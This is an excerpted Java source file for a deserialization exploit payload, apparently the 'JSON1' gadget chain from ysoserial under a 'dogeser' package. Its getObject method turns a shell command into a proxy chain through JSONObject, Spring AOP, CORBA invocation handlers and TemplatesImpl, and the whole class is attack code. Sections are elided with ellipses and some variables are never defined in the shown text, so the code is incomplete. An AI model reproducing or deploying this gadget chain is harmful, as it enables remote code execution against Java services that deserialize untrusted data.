...
public class JSON1 implements ObjectPayload<Object> {
    ...
    public Map getObject ( String command ) throws Exception {
        return makeCallerChain(dogeser.payloads.util.Gadgets.createTemplatesImpl(command), Templates.class);
    }
    ...
    public static Map makeCallerChain ( Object payload, Class... ifaces ) throws OpenDataException, NoSuchMethodException, InstantiationException,
        ...
        InvocationHandler delegateInvocationHandler = (InvocationHandler) dogeser.payloads.util.Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
        InvocationHandler cdsInvocationHandler = dogeser.payloads.util.Gadgets.createMemoizedInvocationHandler(dogeser.payloads.util.Gadgets.createMap("getCompositeType", rt));
        InvocationHandler invocationHandler = (InvocationHandler) dogeser.payloads.util.Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
        ((Map) dogeser.payloads.util.Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        dogeser.payloads.util.Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
        final CompositeData cdsProxy = dogeser.payloads.util.Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);

        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
        dogeser.payloads.util.Reflections.setFieldValue(jo, "properties", m);
        dogeser.payloads.util.Reflections.setFieldValue(jo, "properties", m);
        dogeser.payloads.util.Reflections.setFieldValue(t1, "dataMap", jo);
